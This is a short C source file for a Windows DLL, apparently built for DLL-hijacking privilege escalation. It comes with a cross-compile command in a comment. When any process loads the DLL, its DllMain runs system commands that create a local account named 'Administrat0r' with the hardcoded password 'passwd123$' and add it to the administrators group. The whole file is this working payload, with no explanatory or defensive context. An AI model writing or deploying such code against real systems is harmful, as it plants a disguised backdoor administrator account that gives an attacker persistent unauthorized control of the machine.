#include <stdlib.h>
#include <windows.h>

// crosscompiled with x86_64-w64-mingw32-gcc createadmindll.cpp --shared -o createadmin.dll
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved

{
    switch ( ul_reason_for_call )
    {
        // Process is loading the DLL
        case DLL_PROCESS_ATTACH: 
        system ("net user Administrat0r passwd123$ /add");
        system ("net localgroup administrators Administrat0r /add");
        break;
        // Process is creating a new thread
        case DLL_THREAD_ATTACH: 
        break;
        // Thread exits normally
        case DLL_THREAD_DETACH:
        break;
        // Process unloads the DLL
        case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
